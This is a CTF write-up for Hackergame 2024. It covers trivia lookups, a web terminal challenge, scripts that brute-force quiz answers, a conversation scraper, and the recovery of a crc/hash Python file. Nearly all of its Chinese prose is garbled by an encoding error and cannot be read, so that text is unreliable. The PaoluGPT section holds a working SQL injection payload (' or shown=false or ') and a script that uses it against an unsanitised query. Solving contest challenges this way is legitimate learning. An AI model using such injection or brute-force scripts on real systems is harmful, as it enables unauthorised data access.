---
title: Hackergame 2024 WP
tags: [Technical, CTF, Latest]
keywords: [Hackergame, 2024, Writeup]
description: PRO çš„ Hackergame 2024 Writeup
---

# Hackergame 2024 WP

## ç­¾åˆ°

```javascript
const seps = ["ï¼š", ": "];
const inputs = $$("#inputs-container > input");
inputs.forEach(input => {
    for (const sep of seps) {
        if (input.placeholder.includes(sep)) {
            input.value = input.placeholder.split(sep)[1];
            break;
        }
    }
});
```

## å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€

é¦–å…ˆè¿›å…¥æ‹›æ–°ä¸»é¡µ: https://www.nebuu.la/

> è²Œä¼¼ä¸å¤ªå¥½æœåˆ°ï¼Œè¿™ä¸ªæˆ‘è¿˜æ˜¯ä» Nebula èŠå¤©è®°å½•é‡Œæ‰¾åˆ°çš„ï¼ˆ

- ç»å…¸ `ls` èµ·æ‰‹ï¼Œè²Œä¼¼æ²¡æœ‰å•¥æœ‰ç”¨çš„
- é‚£å°± `ll`ï¼Œæç¤º `command not found`
- `ls -la`ï¼Œå‘ç° `.flag` æ–‡ä»¶
- `cat .flag`ï¼Œå¾—åˆ° flag (Part2: Checkin Again & Again)
- æŸ¥çœ‹ `help`ï¼Œå¾—åˆ°å¯ç”¨å‘½ä»¤åˆ—è¡¨
- ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œå‘ç° `env` å¯ä»¥æŸ¥çœ‹ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­å°±æœ‰ `FLAG` (Part1: Checkin Again)

> å°å£° BBï¼šæ€ä¹ˆä¸èƒ½é€šè¿‡ `echo $FLAG` æ¥æŸ¥çœ‹å‘¢ï¼Ÿ

ä¸€äº›å°å½©è›‹ï¼š

- å°è¯• `cd` æ—¶ä¼šæç¤º `Permission denied: root needed`
- å°è¯• `su`ï¼Œæç¤º `command not found`
- å°è¯• `sudo`ï¼Œæç¤º `Permission denied: with little power comes... no responsibility?`ï¼ŒåŒæ—¶ä¼šè·³è½¬åˆ° [ç¥ç§˜ç½‘ç«™](https://www.bilibili.com/bangumi/play/ss40551)

## çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

### åœ¨ Hackergame 2015 æ¯”èµ›å¼€å§‹å‰ä¸€å¤©æ™šä¸Šå¼€å±•çš„èµ›å‰è®²åº§æ˜¯åœ¨å“ªä¸ªæ•™å®¤ä¸¾è¡Œçš„ï¼Ÿï¼ˆ30 åˆ†ï¼‰

https://lug.ustc.edu.cn/wiki/lug/events/hackergame/ -> https://lug.ustc.edu.cn/wiki/sec/contest.html#:~:text=%E6%99%9A%E4%B8%8A%2019%3A30-,3A204,-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7

### ä¼—æ‰€å‘¨çŸ¥ï¼ŒHackergame å…±çº¦ 25 é“é¢˜ç›®ã€‚è¿‘äº”å¹´ï¼ˆä¸å«ä»Šå¹´ï¼‰ä¸¾åŠçš„ Hackergame ä¸­ï¼Œé¢˜ç›®æ•°é‡æœ€æ¥è¿‘è¿™ä¸ªæ•°å­—çš„é‚£ä¸€å±Šæ¯”èµ›é‡Œæœ‰å¤šå°‘äººæ³¨å†Œå‚åŠ ï¼Ÿï¼ˆ30 åˆ†ï¼‰

`https://github.com/USTC-Hackergame/hackergame20<x>-writeups`, å°† `19` - `23` å³å¯æŸ¥çœ‹é¢˜ç›®æ•°é‡ã€‚ç»Ÿè®¡å¦‚ä¸‹ï¼š

- 2023: 29
- 2022: 33
- 2021: 31
- 2020: 31
- 2019: N/A (æœªæ‰¾åˆ°)

éšåï¼Œåˆ†åˆ«æŸ¥çœ‹ 2023 å’Œ 2019 å¹´çš„æ³¨å†Œäººæ•°ï¼š

- [2023](https://lug.ustc.edu.cn/news/2023/12/hackergame-2023/): N/A (æœªæ‰¾åˆ°å…·ä½“äººæ•°)
- [2019](https://news.ustclug.org/2019/12/hackergame-2019/#:~:text=%E6%9C%AC%E6%AC%A1%E6%AF%94%E8%B5%9B%E4%B8%AD%EF%BC%8C-,%E6%80%BB%E5%85%B1%E6%9C%89%202682%20%E4%BA%BA%E6%B3%A8%E5%86%8C,-%EF%BC%8C1904%20%E4%BA%BA%E8%87%B3%E5%B0%91): 2682

å°è¯•æäº¤ `2682`ï¼Œç­”æ¡ˆæ­£ç¡®ã€‚

### Hackergame 2018 è®©å“ªä¸ªçƒ­é—¨æ£€ç´¢è¯æˆä¸ºäº†ç§‘å¤§å›¾ä¹¦é¦†å½“æœˆçƒ­æœç¬¬ä¸€ï¼Ÿ

- æœç´¢ `Hackergame 2018`ï¼Œæ‰¾åˆ°å½“å¹´çš„ WP: [hackergame2018-writeups](https://github.com/ustclug/hackergame2018-writeups/)
- é¦–å…ˆæŸ¥çœ‹ç­¾åˆ°é¢˜å’ŒçŒ«å’ªé—®ç­”çš„é¢˜å¹²ä¸è§£ç­”ï¼Œå¯ä»¥åœ¨çŒ«å’ªé—®ç­”ä¸­å‘ç°å¦‚ä¸‹æè¿°ï¼š

> åœ¨ä¸­å›½ç§‘å¤§å›¾ä¹¦é¦†ä¸­ï¼Œæœ‰ä¸€æœ¬ä¹¦å«åšã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»:é“¾æ¥ã€è£…è½½ä¸åº“ã€‹ï¼Œè¯·é—®å®ƒçš„ç´¢ä¹¦å·æ˜¯ï¼Ÿ
> æ‰“å¼€ä¸­å›½ç§‘å¤§å›¾ä¹¦é¦†ä¸»é¡µï¼Œç›´æ¥æœç´¢â€œç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€å³å¯ã€‚

é‚£ä¹ˆå°è¯•æäº¤ `ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»`ï¼Œç­”æ¡ˆæ­£ç¡®ã€‚

### åœ¨ä»Šå¹´çš„ USENIX Security å­¦æœ¯ä¼šè®®ä¸Šä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å‘è¡¨äº†ä¸€ç¯‡å…³äºç”µå­é‚®ä»¶ä¼ªé€ æ”»å‡»çš„è®ºæ–‡ï¼Œåœ¨è®ºæ–‡ä¸­ä½œè€…æå‡ºäº† 6 ç§æ”»å‡»æ–¹æ³•ï¼Œå¹¶åœ¨å¤šå°‘ä¸ªç”µå­é‚®ä»¶æœåŠ¡æä¾›å•†åŠå®¢æˆ·ç«¯çš„ç»„åˆä¸Šè¿›è¡Œäº†å®éªŒï¼Ÿ

è¯¢é—® Microsoft Copilotï¼Œå³å¯æ‰¾åˆ° [ç›¸å…³æ–°é—»ç¨¿](https://if.ustc.edu.cn/news/2024_08_20.php#:~:text=Topology%20Obfuscation%E2%80%9D%E5%92%8C%E2%80%9C-,FakeBehalf%3A%20Imperceptible%20Email%20Spoofing%20Attacks%20against%20the%20Delegation%20Mechansim%20in%20Email%20Systems,-%E2%80%9D%E8%A2%AB%E5%BD%95%E7%94%A8%EF%BC%8C%E4%B8%AD%E5%9B%BD)ã€‚æ˜¾ç„¶ï¼Œæˆ‘ä»¬è¦æ‰¾çš„è®ºæ–‡é¢˜ç›®å°±æ˜¯ `FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechansim in Email Systems`ã€‚

![hg2024-copilot](/attachments/hg2024-copilot.jpg)

è¿›å…¥ [USENIX Security '24](https://www.usenix.org/conference/usenixsecurity24) å®˜ç½‘ï¼Œç‚¹å‡» ["technical sessions"](https://www.usenix.org/conference/usenixsecurity24/technical-sessions)ã€‚æœç´¢å…³é”®è¯ "FakeBehalf"ï¼Œå³å¯æ‰¾åˆ° [æ­¤è®ºæ–‡çš„é“¾æ¥](https://www.usenix.org/conference/usenixsecurity24/presentation/ma-jinrui)ï¼Œåœ¨æ­¤é¡µé¢ä¸­å³å¯ [ä¸‹è½½è®ºæ–‡](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)ã€‚

æ‰“å¼€è®ºæ–‡ï¼Œæœç´¢å…³é”®è¯ "combination"ï¼Œå³å¯æ‰¾åˆ°ç›¸å…³æè¿°ï¼š

> All 20 clients are configured as MUAs for all 16 providers via IMAP, resulting in 336 combinations (including 16 web interfaces of target providers).

å°è¯•æäº¤ `336`ï¼Œç­”æ¡ˆæ­£ç¡®ã€‚

### 10 æœˆ 18 æ—¥ Greg Kroah-Hartman å‘ Linux é‚®ä»¶åˆ—è¡¨æäº¤çš„ä¸€ä¸ª patch æŠŠå¤§é‡å¼€å‘è€…ä» MAINTAINERS æ–‡ä»¶ä¸­ç§»é™¤ã€‚è¿™ä¸ª patch è¢«åˆå¹¶è¿› Linux mainline çš„ commit id æ˜¯å¤šå°‘ï¼Ÿ

è¿™æ˜¯ä¸€ä¸ªæŒºå‡ºåçš„äº‹ä»¶ï¼Œç›¸ä¿¡å¤§éƒ¨åˆ†äººéƒ½å¬è¯´è¿‡ã€‚æˆ‘ä»¬ç›´æ¥è¿›åˆ° GitHub ä¸Šçš„ [linux](https://github.com/torvalds/linux) ä»“åº“ï¼ŒæŸ¥çœ‹ [MAINTAINERS çš„ç›¸å…³ commit](https://github.com/torvalds/linux/commits/master/MAINTAINERS)ï¼Œç¿»åˆ°ç›¸åº”æ—¶é—´ï¼Œå³å¯æ‰¾åˆ°ç›¸å…³ commit: [MAINTAINERS: Remove some entries due to various compliance requirements.](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)ã€‚é‚£ä¹ˆå°è¯•æäº¤ `6e90b6`ï¼Œç­”æ¡ˆæ­£ç¡®ã€‚

### å¤§è¯­è¨€æ¨¡å‹ä¼šæŠŠè¾“å…¥åˆ†è§£ä¸ºä¸€ä¸ªä¸€ä¸ªçš„ token åç»§ç»­è®¡ç®—ï¼Œè¯·é—®è¿™ä¸ªç½‘é¡µçš„ HTML æºä»£ç ä¼šè¢« Meta çš„ Llama 3 70B æ¨¡å‹çš„ tokenizer åˆ†è§£ä¸ºå¤šå°‘ä¸ª tokenï¼Ÿ

é¦–å…ˆé€šè¿‡ [åœ¨çº¿ Tokenizer](https://huggingface.co/spaces/Xenova/the-tokenizer-playground) ä½¿ç”¨ `Llama 3` tokenize å½“å‰é¡µé¢çš„ HTML æºä»£ç ï¼Œå¾— token æ•°ä¸º `1947`ï¼š

![hg2024-llama-tokenizer](/attachments/hg2024-llama-tokenizer.jpg)

ç”±äºè¿™ä¸æ˜¯â€œç¬¬ä¸€æ¬¡æ‰“å¼€â€ï¼Œæ•…å°è¯•ç”¨è„šæœ¬ä» `1974` å¼€å§‹é€’å‡ï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®ç­”æ¡ˆã€‚

```javascript
const successTip = "æœ¬æ¬¡æµ‹éªŒæ€»å¾—åˆ†ä¸º 100ã€‚";
const formEl = document.querySelector("form.form-getflag");
const params = new URLSearchParams(new FormData(formEl));
let tokenCount = 1974;
async function checkTokenCount(cnt) {
    params.set("q6", cnt);
    const r = await fetch(location.href, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: params
    });
    const t = await r.text();
    return t.includes(successTip);
}
(async () => {
    while (true && tokenCount > 0) {
        if (await checkTokenCount(tokenCount)) {
            console.log("Found:", tokenCount);
            return;
        }
        tokenCount--;
    }
    console.log("Not found");
})();
```

æœ€ç»ˆç»“æœï¼š`1833`ã€‚

![hg2024-llama-result](/attachments/hg2024-llama-result.jpg)

## æ¯”å¤§å°ç‹

> ä¸€å¼€å§‹æƒ³å·æ‡’ç›´æ¥ç”¨ JS æ¨¡æ‹Ÿç‚¹å‡»ï¼Œå‘ç°è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œäºæ˜¯æ”¹ç”¨ Python è„šæœ¬

```python
from requests import Session
from time import sleep

HOST = "http://202.38.93.141:12122/"
TOKEN = "<TOKEN>"

x = Session()

def auth():
    r = x.post(HOST, params={"token": TOKEN}, allow_redirects=False)
    assert r.status_code == 302

def start():
    r = x.post(HOST + "game", json={})
    return r.json()

def solve(data):
    values = data["values"]
    inputs = []
    for a, b in values:
        if a > b:
            inputs.append(">")
        elif a < b:
            inputs.append("<")
        else:
            inputs.append("=")
    return inputs

def submit(inputs):
    r = x.post(HOST + "submit", json={"inputs": inputs})
    return r.json()

auth()
game = start()
inputs = solve(game)
sleep(5) # 3 or 4 is too fast
result = submit(inputs)
print(result)
```

## æ‰“ä¸å¼€çš„ç›’

https://www.viewstl.com/ ä¸Šä¼ æ–‡ä»¶ï¼Œæ»šåŠ¨é¼ æ ‡ï¼Œè§†è§’ç©¿è¿‡ç›’å­å³å¯çœ‹åˆ° flag

## æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼

ä½¿ç”¨ç¦æ˜•å°†è®ºæ–‡è½¬ä¸º `.rtf` æ ¼å¼ï¼Œç„¶åç”¨ Word æ‰“å¼€ï¼Œæœç´¢å…³é”®è¯ `flag`ã€‚åœ¨ Figure 4 çš„ "Semantic Space" å›¾ç‰‡ä¸‹æ–¹å¯ä»¥çœ‹åˆ°å…³é”®è¯ flagã€‚å›åˆ°ç¦æ˜•ï¼ŒæŠŠæ­¤å›¾ç‰‡åˆ é™¤ï¼Œå³å¯çœ‹åˆ°è¢«é®æŒ¡çš„ flagã€‚

## æ—…è¡Œç…§ç‰‡ 4.0

### é¢˜ç›® 1-2

#### é—®é¢˜ 1: ç…§ç‰‡æ‹æ‘„çš„ä½ç½®è·ç¦»ä¸­ç§‘å¤§çš„å“ªä¸ªæ ¡é—¨æ›´è¿‘ï¼Ÿï¼ˆæ ¼å¼ï¼šXæ ¡åŒºYé—¨ï¼Œå‡ä¸ºä¸€ä¸ªæ±‰å­—ï¼‰

[ç™¾åº¦åœ°å›¾](<https://map.baidu.com/search/%E4%B8%AD%E5%9B%BD%E8%9C%80%E5%B1%B1%E7%A7%91%E9%87%8C%E7%A7%91%E6%B0%94%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99(%E7%A7%91%E5%A4%A7%E7%AB%99)/@13054806.545,3720055.77,18.04z?querytype=s&wd=%E4%B8%AD%E5%9B%BD%E8%9C%80%E5%B1%B1%E7%A7%91%E9%87%8C%E7%A7%91%E6%B0%94%E7%A7%91%E5%88%9B%E9%A9%BF%E7%AB%99(%E7%A7%91%E5%A4%A7%E7%AB%99)&c=127&src=0&wd2=%E5%90%88%E8%82%A5%E5%B8%82%E8%9C%80%E5%B1%B1%E5%8C%BA&pn=0&sug=1&l=12&b=(12999309,3690787.5;13101709,3744867.5)&from=webmap&biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&sug_forward=847a2f26f36115f5f33cba4a&device_ratio=2>)ï¼Œå¯çŸ¥æ˜¯ `ä¸­æ ¡åŒºä¸œé—¨`/`ä¸œæ ¡åŒºè¥¿é—¨`ã€‚ç”±äºä¸­æ ¡åŒºæ²¡æœ‰ä¸œé—¨ï¼Œæ•…å¡« `ä¸œæ ¡åŒºè¥¿é—¨`ã€‚

#### é—®é¢˜ 2: è¯è¯´ Leo é…±ä¸Šæ¬¡å‡ºç°åœ¨æ¡æ¶ä¸Šæ˜¯â€¦â€¦ç§‘å¤§ä»Šå¹´çš„ ACG éŸ³ä¹ä¼šï¼Ÿæ´»åŠ¨æ—¥æœŸæˆ‘æ²¡è®°é”™çš„è¯æ˜¯ï¼Ÿï¼ˆæ ¼å¼ï¼šYYYYMMDDï¼‰

ä» `20241031` å‘å‰æšä¸¾ã€‚

```javascript
async function solveForm1() {
    const date = new Date("2024-10-31");
    const minDate = new Date("2024-01-01");
    const form1 = document.querySelector("#form1");
    const params = new URLSearchParams(new FormData(form1));
    params.set("Answer1", "ä¸œæ ¡åŒºè¥¿é—¨");
    async function test(date) {
        const dateStr = date.toISOString().split("T")[0].replace(/-/g, "");
        params.set("Answer2", dateStr);
        const r = await fetch(location.href, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            },
            // Line 36: btoa($(this).serialize()) + ".txt";
            body: btoa(unescape(encodeURIComponent(params))) + ".txt"
        });
        return r.status !== 404;
    }
    while (date >= minDate) {
        date.setDate(date.getDate() - 1);
        if (await test(date)) {
            console.log("Found:", date);
            break;
        }
    }
}
solveForm1();
```

æœ€ç»ˆç»“æœï¼š`Sun May 19 2024` (`20240519`)

### é¢˜ç›® 3-4

#### é—®é¢˜ 3: è¿™ä¸ªå…¬å›­çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆä¸éœ€è¦å¡«å†™å…¬å›­æ‰€åœ¨å¸‚åŒºç­‰ä¿¡æ¯ï¼‰

è¿™å¼ å›¾çš„ä¸»è¦å…³æ³¨ç‚¹åº”è¯¥å°±æ˜¯å½©è™¹è·‘é“äº†ã€‚ç›´æ¥è°·æ­Œæœå›¾çš„è¯æ˜¯éš¾ä»¥æ‰¾åˆ°æœ‰æ•ˆç»“æœçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬èšç„¦åˆ°å½©è™¹è·‘é“ä¸Šï¼š

![hg2024-rainbow-track-1](/attachments/hg2024-rainbow-track-1.jpg)

å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªç»“æœçš„å½©è™¹é¢œè‰²ã€æ–¹å‘ç­‰å‡ä¸ç»™å®šå›¾ç‰‡ç›¸ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç‚¹è¿›é“¾æ¥æŸ¥çœ‹ç›¸å…³ä¿¡æ¯ã€‚å¾ˆä¸å¹¸çš„æ˜¯ï¼Œ[è¿™ä¸ªé“¾æ¥](https://www.sohu.com/a/499750254_99986045) å·²ç» 404 äº†ï¼Œæˆ‘ä»¬åªèƒ½å¤åˆ¶å®ƒçš„å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æœå›¾ï¼š

![hg2024-rainbow-track-2](/attachments/hg2024-rainbow-track-2.jpg)

è¿æ°”ä¸é”™ï¼Œå¥½æ­¹ [ç¬¬äºŒä¸ªç»“æœ](https://www.sohu.com/a/500416746_100023473#:~:text=%E6%97%A5%EF%BC%8C%E5%B8%82%E6%B0%91%E5%9C%A8-,%E5%9F%8E%E5%8C%BA%E4%B8%AD%E5%A4%AE%E5%85%AC%E5%9B%AD,-%E5%86%85%E5%81%A5%E8%BA%AB%E3%80%81%E4%BC%91%E9%97%B2) æ˜¯å¯ä»¥æ‰“å¼€çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å°è¯•æäº¤ `åŸåŒºä¸­å¤®å…¬å›­`/`ä¸­å¤®å…¬å›­`ï¼Œæœ€ç»ˆç»“æœä¸º `ä¸­å¤®å…¬å›­`ã€‚

#### é—®é¢˜ 4: è¿™ä¸ªæ™¯è§‚æ‰€åœ¨çš„æ™¯ç‚¹çš„åå­—æ˜¯ï¼Ÿï¼ˆä¸‰ä¸ªæ±‰å­—ï¼‰

ç›´æ¥è°·æ­Œæœå›¾ï¼Œå¯çŸ¥æ˜¯ä½äºå®œæ˜Œçš„ `å›å­å²­`ã€‚

### é¢˜ç›® 5-6

#### ğŸ”´ é—®é¢˜ 5: è·ç¦»æ‹æ‘„åœ°æœ€è¿‘çš„åŒ»é™¢æ˜¯ï¼Ÿï¼ˆæ— éœ€åŒ…å«é™¢åŒºã€åœ°åä¿¡æ¯ï¼Œæ ¼å¼ï¼šXXXåŒ»é™¢ï¼‰

æ‰¾ä¸åˆ°ã€‚byd `é‡åº†è¥¿åŠ¨è½¦è¿ç”¨æ‰€` å’Œ `æ€€æŸ”â€”å¯†äº‘çº¿` éƒ½æ‰¾è¿‡äº†ï¼Œç»“æœçœ‹ WP å‘ç°ç…§ç‰‡æ˜¯åœ¨ [`åŒ—äº¬åŒ—åŠ¨è½¦è¿ç”¨æ‰€`](<https://map.baidu.com/search/%E5%8C%97%E4%BA%AC%E5%8C%97%E5%8A%A8%E8%BD%A6%E8%BF%90%E7%94%A8%E6%89%80/@12947392.800727855,4848935.849935234,17.8z/maptype%3DB_EARTH_MAP?querytype=s&wd=%E5%8C%97%E4%BA%AC%E5%8C%97%E5%8A%A8%E8%BD%A6%E8%BF%90%E7%94%A8%E6%89%80&c=131&src=0&wd2=%E5%8C%97%E4%BA%AC%E5%B8%82%E6%98%8C%E5%B9%B3%E5%8C%BA&pn=0&sug=1&l=15&b=(12959151,4819384;12971951,4826144)&biz_forward=%7B%22scaler%22:2,%22styles%22:%22pl%22%7D&sug_forward=5cb2285dcb8c33d7f7e73bcc&device_ratio=2>)ã€‚çœ‹æ¥è¿˜æ˜¯ Not Powerful Enough :)

![hg2024-station.jpg](/attachments/hg2024-station.jpg)

é‚£ä¹ˆå¾ˆæ˜¾ç„¶äº†ï¼Œå‘¨è¾¹æœç´¢â€œåŒ»é™¢â€ï¼Œç­”æ¡ˆå°±æ˜¯ `ç§¯æ°´æ½­åŒ»é™¢`ã€‚

![hg2024-hospital.jpg](/attachments/hg2024-hospital.jpg)

#### é—®é¢˜ 6: å·¦ä¸‹è§’çš„åŠ¨è½¦ç»„å‹å·æ˜¯ï¼Ÿ

è°·æ­Œæœå›¾ï¼Œèšç„¦åˆ°å·¦ä¸‹è§’çš„åŠ¨è½¦ç»„ã€‚å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªç»“æœä¸èƒ½è¯´ååˆ†ç›¸ä¼¼ï¼Œåªèƒ½è¯´ä¸€æ¨¡ä¸€æ ·ã€‚

![hg2024-train](/attachments/hg2024-train.jpg)

`CRH6F-A`ã€‚

## PaoluGPT

### åƒé‡ŒæŒ‘ä¸€

æ ¹æ®æ ‡é¢˜çš„æç¤ºï¼Œç»¼åˆ `/list` ç•Œé¢æ€»å…±æœ‰ 999 æ¡å¯¹è¯ï¼Œå¯ä»¥çŒœæµ‹ flag è—åœ¨èŠå¤©è®°å½•ä¸­ã€‚é‚ç¼–å†™è„šæœ¬çˆ¬å–èŠå¤©è®°å½•ï¼ŒæŸ¥æ‰¾ flagã€‚

```python
from requests import Session # pip install requests
from bs4 import BeautifulSoup # pip install beautifulsoup4
from re import compile

HOST = "chal01-x43lv6ik.hack-challenge.lug.ustc.edu.cn:8443"
SESSION = "<SESSION>"
FLAG_REGEX = compile(r"flag\{.*\}")

x = Session()
x.cookies.set("session", SESSION)

historyHTML = x.get(f"https://{HOST}/list").text
soup = BeautifulSoup(historyHTML, "html.parser")

# <ul>
#     <li><a href="/view?conversation_id=<id>">Title</a></li>
#     ...
# </ul>

# Get a list of conversations
conversations = {}
conversationsEl = soup.find("ul")
for conversationEl in conversationsEl.find_all("li"):
    # Get the conversation ID
    conversationId = conversationEl.find("a")["href"].split("=")[1]
    # Get the conversation title
    title = conversationEl.find("a").text
    print(conversationId, title)
    # Get the conversation content
    conversationHTML = x.get(f"https://{HOST}/view?conversation_id={conversationId}").text
    soup = BeautifulSoup(conversationHTML, "html.parser")
    # <div class="container pt-3">
    #     <h2>èŠå¤©è®°å½•ï¼šprompt</h2>
    #     <div style="white-space: pre-line;">response</div>
    # </div>
    content = soup.find("div", class_="container pt-3")
    prompt = content.find("h2").text
    response = content.find("div").text
    conversations[conversationId] = {
        "prompt": prompt,
        "response": response
    }
    m = FLAG_REGEX.search(response)
    if m:
        print("* Flag found! Prompt:", prompt)
        print(m.group())
        break
```

### çª¥è§æœªçŸ¥

æ ¹æ®æ ‡é¢˜çš„æç¤ºï¼Œåˆç†æ¨æµ‹æœ‰ä¸€æ¡å¯¹è¯è¢«éšè—äº†ï¼Œè€Œéšè—çš„å¯¹è¯å¾ˆæœ‰å¯èƒ½å«æœ‰ç¬¬äºŒä¸ª flagã€‚æŸ¥çœ‹é™„ä»¶ï¼Œé‡ç‚¹å…³æ³¨å¦‚ä¸‹ä»£ç ï¼š

```python
@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)

@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

æ³¨æ„åˆ°å¯ç–‘çš„ `shown` å­—æ®µï¼Œé‚å°è¯•æ³¨å…¥å¦‚ä¸‹ Queryï¼š

```
' or shown=false or '
```

é‚£ä¹ˆæœ€ç»ˆæ‰§è¡Œçš„ SQL è¯­å¥ä¸ºï¼š

```sql
select title, contents from messages where id = '1' or shown=false or ''
```

å³å¯æŸ¥çœ‹æœªæ˜¾ç¤ºçš„å¯¹è¯ã€‚æ®æ­¤ç¼–å†™è„šæœ¬ï¼š

```python
r = x.get(f"https://{HOST}/view?conversation_id=1' or shown=false or '")
m = FLAG_REGEX.search(r.text)
if m:
    print("* Flag 2 found!")
    print(m.group())
```

æ³¨æ„éœ€è¦å°†ç»“æœä¸­çš„ `&amp;` æ›¿æ¢ä¸º `&`ã€‚å®é™…ä¸Šä¹Ÿå¯ä»¥æµè§ˆå™¨ä¸­ç›´æ¥è®¿é—® `/view?conversation_id=1' or shown=false or '`ï¼Œç„¶åæ»šåŠ¨åˆ°åº•éƒ¨æŸ¥çœ‹ flagã€‚

## æƒœå­—å¦‚é‡‘ 3.0

### é¢˜ç›® A

è¿™é¢˜ä¸¢å¤±çš„ä¿¡æ¯é‡æ¯”è¾ƒå°‘ï¼Œå…ˆç›´æ¥å–‚ç»™ ChatGPT è¿›è¡Œå¤„ç†ï¼Œç„¶åæäº¤æŸ¥çœ‹ä¸ä¸€è‡´çš„åœ°æ–¹ï¼Œæœ€åæ‰‹åŠ¨ä¿®æ­£ã€‚é™„ä¸Š [ChatGPT çš„èŠå¤©è®°å½•](https://chatgpt.com/share/672a29f8-bddc-800f-a004-bc03bdec4299)ã€‚

å¾—åˆ° AI ä¿®å¤çš„æ–‡ä»¶åï¼Œæ‰‹åŠ¨è¡¥ä¸€ä¸‹ç©ºæ ¼å¹¶ä¿®æ”¹è¢« ChatGPT è¯¯åˆ¤çš„åœ°æ–¹ï¼Œå¾—åˆ° flagã€‚æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ã€‚åŸæ–‡ä»¶ï¼š

```python
#!/usr/bin/python3

import atexit, base64, flask, itertools, os, re


def crc(input: bytes) -> int:
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A'
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))
    digest = (1 << poly_degree) - 1
    for b in input:
        digest = digest ^ b
        for _ in range(8):
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)
    return digest ^ (1 << poly_degree) - 1


def hash(input: bytes) -> bytes:
    digest = crc(input)
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)
    return digest.to_bytes(48 // 8, 'little')


def xzrj(input: bytes) -> bytes:
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'
    return re.sub(pat, repl, input, flags=re.IGNORECASE)


paths: list[bytes] = []

xzrj_bytes: bytes = bytes()

with open(__file__, 'rb') as f:
    for row in f.read().splitlines():
        row = (row.rstrip() + b' ' * 80)[:80]
        path = base64.b85encode(hash(row)) + b'.txt'
        with open(path, 'wb') as pf:
            pf.write(row)
            paths.append(path)
            xzrj_bytes += xzrj(row) + b'\r\n'

    def clean():
        for path in paths:
            try:
                os.remove(path)
            except FileNotFoundError:
                pass

    atexit.register(clean)


bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)


@bp.get('/answer_a.py')
def get() -> flask.Response:
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8')


@bp.post('/answer_a.py')
def post() -> flask.Response:
    wrong_hints = {}
    req_lines = flask.request.get_data().splitlines()
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)
    for index, (path, req_row) in iter:
        if path is None:
            wrong_hints[index] = 'Too many lines for request data'
            break
        if req_row is None:
            wrong_hints[index] = 'Too few lines for request data'
            continue
        req_row_hash = hash(req_row)
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'
        if not os.path.exists(req_row_path):
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'
            continue
        with open(req_row_path, 'rb') as pf:
            row = pf.read()
            if len(req_row) != len(row):
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'
                continue
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b]
            if unmatched:
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'
                continue
            if path != req_row_path:
                wrong_hints[index] = f'Matched but in other lines'
                continue
    if wrong_hints:
        return {'wrong_hints': wrong_hints}, 400
    with open('answer_a.txt', 'rb') as af:
        answer_flag = base64.b85decode(af.read()).decode()
        closing, opening = answer_flag[-1:], answer_flag[:5]
        assert closing == '}' and opening == 'flag{'
        return {'answer_flag': answer_flag}, 200
```

### ğŸ”´ é¢˜ç›® B

æ‰‹åŠ¨è¡¥ä¸€ä¸‹ç©ºæ ¼å¹¶ä¿®æ”¹è¢« ChatGPT è¯¯åˆ¤çš„åœ°æ–¹ï¼Œå‘ç°æœ‰ä¸€è¡Œéœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚æƒœå­—å¦‚é‡‘åŒ–åçš„è¿™ä¸€è¡Œæ˜¯ï¼š

```python
    poly, poly_degree = 'B', 48
```

